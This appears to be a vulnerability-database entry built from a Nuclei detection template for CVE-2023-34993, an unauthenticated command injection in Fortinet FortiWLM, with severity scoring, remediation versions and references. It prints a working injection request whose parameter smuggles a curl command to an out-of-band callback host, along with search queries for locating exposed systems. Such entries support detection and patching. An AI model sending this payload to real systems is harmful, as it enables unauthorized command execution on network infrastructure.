---
layout: "post"
cve_id: "CVE-2023-34993"
title: "Fortinet FortiWLM Unauthenticated Command Injection Vulnerability"
pcap: true
pcap_path: "/pcaps/2023/CVE-2023-34993.pcap"
nuclei_url: "https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2023/CVE-2023-34993.yaml"
author: "dwisiswant0"
severity: "critical"
impact: "Unauthenticated attackers can exploit OS command injection to execute unauthorized commands on Fortinet FortiWLM systems, enabling complete system compromise and network infiltration.
"
remediation: "For FortiWLM version 8.6.0 through 8.6.5 upgrade to version >= 8.6.6.
For FortiWLM version 8.5.0 through 8.5.4 upgrade to version >= 8.5.5.
"
reference:
  - "https://fortiguard.com/psirt/FG-IR-23-140"
  - "https://www.horizon3.ai/attack-research/attack-blogs/fortiwlm-the-almost-story-for-the-forti-forty/"
classification: "{'cvss-metrics': 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H', 'cvss-score': 9.8, 'cve-id': 'CVE-2023-34993', 'cwe-id': 'CWE-78', 'epss-score': 0.86419, 'epss-percentile': 0.99382, 'cpe': 'cpe:2.3:a:fortinet:fortiwlm:*:*:*:*:*:*:*:*'}"
metadata: "{'max-request': 1, 'vendor': 'fortinet', 'product': 'fortiwlm', 'shodan-query': ['http.title:"FortiWLM"', 'http.html:"fortiwlm"', 'http.title:"fortiwlm"'], 'fofa-query': ['body="fortiwlm"', 'title="fortiwlm"'], 'google-query': 'intitle:"fortiwlm"'}"
tags:
  - "cve"
  - "cve2023"
  - "fortinet"
  - "fortiwlm"
  - "rce"
  - "unauth"
  - "vkev"
  - "vuln"
snort2_rule: |
  N/A
snort3_rule: |
  N/A
---

## üîç Vulnerability Description
A improper neutralization of special elements used in an os command ('os
command injection') in Fortinet FortiWLM version 8.6.0 through 8.6.5 and
8.5.0 through 8.5.4 allows attacker to execute unauthorized code or commands
Successful exploitation of this vulnerability could allow an attacker to
bypass authentication and gain unauthorized access to the affected system.


## üåê HTTP Request
```nohighlight
GET /ems/cgi-bin/ezrf_upgrade_images.cgi?op_type=deleteprogressfile&progressfile=Rcdr9%3Bcurl%20d5irg61le0o2se4g1bmgmd5jaqfr5cwuw.oast.pro%20%23 HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:1.9.5.20) Gecko/ Firefox/9.0
Connection: close
Accept: */*
Accept-Language: en
Accept-Encoding: gzip
```

